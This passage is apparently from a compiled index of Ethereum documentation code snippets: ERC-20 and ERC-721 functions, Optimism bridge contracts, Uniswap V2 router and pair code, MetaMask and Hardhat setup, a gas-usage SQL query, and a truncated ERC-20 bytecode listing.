  }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * ether and wei. Esse é o valor {ERC20} usado, a menos que {_setupDecimals} seja\n     * chamado.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n```\n\n----------------------------------------\n\nTITLE: Finalizing ETH Withdrawal from L2 to L1 in Solidity\nDESCRIPTION: External function called by the cross-domain messenger to complete an ETH withdrawal from L2 to L1. It verifies the caller is authorized, transfers ETH to the recipient, and emits a completion event.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction finalizeETHWithdrawal(\n    address _from,\n    address _to,\n    uint256 _amount,\n    bytes calldata _data\n) external onlyFromCrossDomainAccount(l2TokenBridge) {\n    // slither-disable-next-line reentrancy-events\n    (bool success, ) = _to.call{ value: _amount }(new bytes(0));\n    require(success, \"TransferHelper::safeTransferETH: ETH transfer failed\");\n    \n    // slither-disable-next-line reentrancy-events\n    emit ETHWithdrawalFinalized(_from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Writing a Smart Contract Deployment Script with Ethers.js\nDESCRIPTION: A JavaScript deployment script that uses ethers.js to deploy the HelloWorld contract to the Ethereum network. It initializes the contract with a \"Hello World!\" message and logs the deployment address.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n   const HelloWorld = await ethers.getContractFactory(\"HelloWorld\");\n\n   // Start deployment, returning a promise that resolves to a contract object\n   const hello_world = await HelloWorld.deploy(\"Hello World!\");\n   console.log(\"Contract deployed to address:\", hello_world.address);}\n\nmain()\n  .then(() => process.exit(0))\n  .catch(error => {\n    console.error(error);\n    process.exit(1);\n  });\n```\n\n----------------------------------------\n\nTITLE: Initializing UniswapV2Pair Contract in Solidity\nDESCRIPTION: The beginning of the UniswapV2Pair contract, which implements the core token exchange pool functionality. It imports necessary interfaces and libraries, inherits from UniswapV2ERC20 for liquidity token functions, and sets up SafeMath and UQ112x112 for arithmetic operations.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity =0.5.16;\n\nimport './interfaces/IUniswapV2Pair.sol';\nimport './UniswapV2ERC20.sol';\nimport './libraries/Math.sol';\nimport './libraries/UQ112x112.sol';\nimport './interfaces/IERC20.sol';\nimport './interfaces/IUniswapV2Factory.sol';\nimport './interfaces/IUniswapV2Callee.sol';\n\ncontract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 {\n    using SafeMath  for uint;\n    using UQ112x112 for uint224;\n```\n\n----------------------------------------\n\nTITLE: Implementing connectWallet Function for MetaMask Integration in JavaScript\nDESCRIPTION: This function handles MetaMask wallet connection requests. It checks if MetaMask is installed, requests user account access, and returns an object containing the connected address and status message. If MetaMask isn't installed, it prompts the user to install it.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nexport const connectWallet = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_requestAccounts\",\n      })\n      const obj = {\n        status: \"👆🏽 Write a message in the text-field above.\",\n        address: addressArray[0],\n      }\n      return obj\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing and Extending ERC721 Token from OpenZeppelin\nDESCRIPTION: Demonstrates how to import an ERC721 non-fungible token implementation from OpenZeppelin's npm package and extend it to create a custom NFT contract.\n\nLANGUAGE: solidity\nCODE:\n```\n// This will load the @openzeppelin/contracts library from your node_modules\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\ncontract MyNFT is ERC721 {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") public { }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Daily Gas Usage in Ethereum SQL\nDESCRIPTION: SQL query that calculates the average gas used per day in Ethereum blocks. This represents the demand for block space on the Ethereum network.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    AVG(gas_used) AS avg_block_gas_used\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n```\n\n----------------------------------------\n\nTITLE: Implementing onlyFromCrossDomainAccount Modifier\nDESCRIPTION: This modifier is used to restrict function calls to only those originating from a specific cross-domain account, ensuring that only the bridge on the other layer can trigger certain functions.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**********************\n     * Function Modifiers *\n     **********************/\n\n    /**\n     * Enforces that the modified function is only callable by a specific cross-domain account.\n     * @param _sourceDomainAccount The only account on the originating domain which is\n     *  authenticated to call this function.\n     */\n    modifier onlyFromCrossDomainAccount(address _sourceDomainAccount) {\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Ethereum Deployment\nDESCRIPTION: Configuration for Hardhat to connect with the Goerli testnet. This setup loads environment variables for the Alchemy API URL and private key, and configures networks for deployment.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire('dotenv').config();\n\nrequire(\"@nomiclabs/hardhat-ethers\");\nconst { API_URL, PRIVATE_KEY } = process.env;\n\n/**\n* @type import('hardhat/config').HardhatUserConfig\n*/\nmodule.exports = {\n   solidity: \"0.7.3\",\n   defaultNetwork: \"goerli\",\n   networks: {\n      hardhat: {},\n      goerli: {\n         url: API_URL,\n         accounts: [`0x${PRIVATE_KEY}`]\n      }\n   },\n}\n```\n\n----------------------------------------\n\nTITLE: L2 Bridge Successful Deposit Handling in Solidity\nDESCRIPTION: Code that handles successful deposits by minting tokens to the recipient on L2 and emitting an event. This is executed when all security checks pass.\n\nLANGUAGE: solidity\nCODE:\n```\n        ) {\n            // When a deposit is finalized, we credit the account on L2 with the same amount of\n            // tokens.\n            // slither-disable-next-line reentrancy-events\n            IL2StandardERC20(_l2Token).mint(_to, _amount);\n            // slither-disable-next-line reentrancy-events\n            emit DepositFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n```\n\n----------------------------------------\n\nTITLE: L2StandardBridge Constructor in Solidity\nDESCRIPTION: Initializes the L2StandardBridge with the cross-domain messenger and L1 bridge address, establishing the connection between L1 and L2 for token bridging operations.\n\nLANGUAGE: solidity\nCODE:\n```\n    /***************\n     * Constructor *\n     ***************/\n\n    /**\n     * @param _l2CrossDomainMessenger Cross-domain messenger used by this contract.\n     * @param _l1TokenBridge Address of the L1 bridge deployed to the main chain.\n     */\n    constructor(address _l2CrossDomainMessenger, address _l1TokenBridge)\n        CrossDomainEnabled(_l2CrossDomainMessenger)\n    {\n        l1TokenBridge = _l1TokenBridge;\n    }\n```\n\n----------------------------------------\n\nTITLE: Defining Uniswap Pair Contract Events\nDESCRIPTION: Events emitted during key operations like liquidity provision (Mint), liquidity withdrawal (Burn), token swaps, and reserve synchronization to provide transparency and enable off-chain tracking.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Mint(address indexed sender, uint amount0, uint amount1);\nevent Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n```\n\nLANGUAGE: solidity\nCODE:\n```\nevent Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n```\n\nLANGUAGE: solidity\nCODE:\n```\nevent Sync(uint112 reserve0, uint112 reserve1);\n```\n\n----------------------------------------\n\nTITLE: Removing Liquidity with Permit in Uniswap V2\nDESCRIPTION: These functions enable meta-transactions for liquidity removal through the permit mechanism. They allow users without ETH to withdraw from liquidity pools by signing a message that grants permission to the router contract to spend their LP tokens.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountA, uint amountB) {\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);\n}\n\n\nfunction removeLiquidityETHWithPermit(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountToken, uint amountETH) {\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline);\n}\n```\n\n----------------------------------------\n\nTITLE: Importing pinJSONToIPFS Function in Ethereum NFT Minter\nDESCRIPTION: Imports the pinJSONToIPFS function from the pinata.js file to enable IPFS metadata storage functionality in the interact.js file.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { pinJSONToIPFS } from \"./pinata.js\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving Share Balance in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function returns the total amount of vault shares currently owned by the specified owner.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction balanceOf(address owner) public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: ERC-223 Transfer Event Definition in Solidity\nDESCRIPTION: The event definition for ERC-223 token transfers. This event is emitted whenever tokens are transferred and includes the sender, recipient, value, and any attached data.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Transfer(address indexed _from, address indexed _to, uint256 _value, bytes calldata _data)\n```\n\n----------------------------------------\n\nTITLE: L2 Bridge Deposit Error Recovery in Solidity\nDESCRIPTION: Error handling code that initiates a withdrawal back to L1 if the token compatibility checks fail. This helps users recover funds in case of errors in token address specification.\n\nLANGUAGE: solidity\nCODE:\n```\n        } else {\n            // Either the L2 token which is being deposited-into disagrees about the correct address\n            // of its L1 token, or does not support the correct interface.\n            // This should only happen if there is a  malicious L2 token, or if a user somehow\n            // specified the wrong L2 token address to deposit into.\n            // In either case, we stop the process here and construct a withdrawal\n            // message so that users can get their funds out in some cases.\n            // There is no way to prevent malicious token contracts altogether, but this does limit\n            // user error and mitigate some forms of malicious contract behavior.\n            bytes memory message = abi.encodeWithSelector(\n                IL1ERC20Bridge.finalizeERC20Withdrawal.selector,\n                _l1Token,\n                _l2Token,\n                _to, // switched the _to and _from here to bounce back the deposit to the sender\n                _from,\n                _amount,\n                _data\n            );\n\n            // Send message up to L1 bridge\n            // slither-disable-next-line reentrancy-events\n            sendCrossDomainMessage(l1TokenBridge, 0, message);\n            // slither-disable-next-line reentrancy-events\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Banking State Transition with JavaScript\nDESCRIPTION: A JavaScript-like example showing how a banking state transition function would process a valid transaction, transferring $20 from Alice to Bob resulting in an updated state.\n\nLANGUAGE: javascript\nCODE:\n```\nAPPLY({ Alice: $50, Bob: $50 },\"kirim $20 dari Alice ke Bob\") = { Alice: $30, Bob: $70 }\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-165 Interface Support in Vyper\nDESCRIPTION: Declaration of variables for ERC-165 interface support. This includes a HashMap to track supported interfaces and constants for ERC-165 and ERC-721 interface IDs, enabling the contract to advertise its compatibility.\n\nLANGUAGE: vyper\nCODE:\n```\n# @dev Mapping of interface id to bool about whether or not it's supported\nsupportedInterfaces: HashMap[bytes32, bool]\n\n# @dev ERC165 interface ID of ERC165\nERC165_INTERFACE_ID: constant(bytes32) = 0x0000000000000000000000000000000000000000000000000000000001ffc9a7\n\n# @dev ERC165 interface ID of ERC721\nERC721_INTERFACE_ID: constant(bytes32) = 0x0000000000000000000000000000000000000000000000000000000080ac58cd\n```\n\n----------------------------------------\n\nTITLE: Implementing onlyFromCrossDomainAccount Modifier for Authentication\nDESCRIPTION: Definition of the onlyFromCrossDomainAccount modifier that ensures functions can only be called by a specific account from another domain. It verifies both the messenger contract and the cross-domain sender.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**********************\n     * Function Modifiers *\n     **********************/\n\n    /**\n     * Enforces that the modified function is only callable by a specific cross-domain account.\n     * @param _sourceDomainAccount The only account on the originating domain which is\n     *  authenticated to call this function.\n     */\n    modifier onlyFromCrossDomainAccount(address _sourceDomainAccount) {\n        require(\n            msg.sender == address(getCrossDomainMessenger()),\n            \"OVM_XCHAIN: messenger contract unauthenticated\"\n        );\n\n        require(\n            getCrossDomainMessenger().xDomainMessageSender() == _sourceDomainAccount,\n            \"OVM_XCHAIN: wrong sender of cross-domain message\"\n        );\n\n        _;\n    }\n```\n\n----------------------------------------\n\nTITLE: Validating Token Ownership or Approval in Solidity\nDESCRIPTION: Internal function checking if an address is either the owner of a token or is approved to manage it, through direct approval or operator approval. Includes a Solium linter exception for operator formatting.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction _isApprovedOrOwner(address spender, uint256 pizzaId)\n        internal\n        view\n        returns (bool)\n    {\n        address owner = pizzaToOwner[pizzaId];\n        // Disable solium check because of\n        // https://github.com/duaraghav8/Solium/issues/175\n        // solium-disable-next-line operator-whitespace\n        return (spender == owner ||\n            this.getApproved(pizzaId) == spender ||\n            this.isApprovedForAll(owner, spender));\n    }\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Token Transfer and Allowance Management in EVM Bytecode\nDESCRIPTION: Low-level EVM bytecode implementing core ERC-20 token functionality including transfers, allowance checking, and balance management. The code contains stack manipulations, memory operations, and event emissions that form the foundation of the token contract.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\nDD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x747 PUSH2 0x6AB PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x742 DUP6 PUSH1 0x1 PUSH1 0x0 PUSH2 0x6BC PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x831 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x806 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x831 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x814 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8FE PUSH2 0x848 PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x8F9 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1097 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 PUSH2 0x872 PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x91C PUSH2 0x915 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xAC1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFDE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP JUMPDEST PUSH2 0xD2E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1000 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x0 DUP1 DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0xF1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 